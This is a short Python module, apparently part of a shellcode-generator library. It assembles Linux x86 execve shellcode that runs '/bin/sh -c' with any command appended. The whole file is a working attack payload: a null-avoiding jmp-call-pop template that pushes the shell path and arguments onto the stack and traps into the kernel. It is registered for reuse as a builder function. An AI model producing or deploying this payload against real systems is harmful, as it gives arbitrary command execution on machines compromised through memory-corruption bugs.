"""Linux x86 — execve("/bin/sh", ["/bin/sh", "-c", cmd], NULL) via int 0x80.

SYS_execve = 11.
  eax = 11
  ebx = filename ptr  ("/bin/sh")
  ecx = argv ptr      (["/bin/sh", "-c", cmd, NULL])
  edx = envp ptr      (NULL)
"""
from __future__ import annotations

from .._asm import assemble
from . import register

_TEMPLATE = """\
jmp get_str

exec:
pop esi

xor eax, eax
push eax
push 0x68732f2f
push 0x6e69622f
mov ebx, esp

push eax
mov word ptr [esp], 0x632d
mov ecx, esp

push eax
push esi
push ecx
push ebx
mov ecx, esp

xor edx, edx
mov al, 11
int 0x80

get_str:
call exec
"""


@register("linux", "x86")
def build(cmd: str) -> bytes:
    """Assemble Linux x86 execve shellcode for the given command string."""
    code = assemble(_TEMPLATE, arch="x86", mode="32")
    return code + cmd.encode("latin-1") + b"\x00"
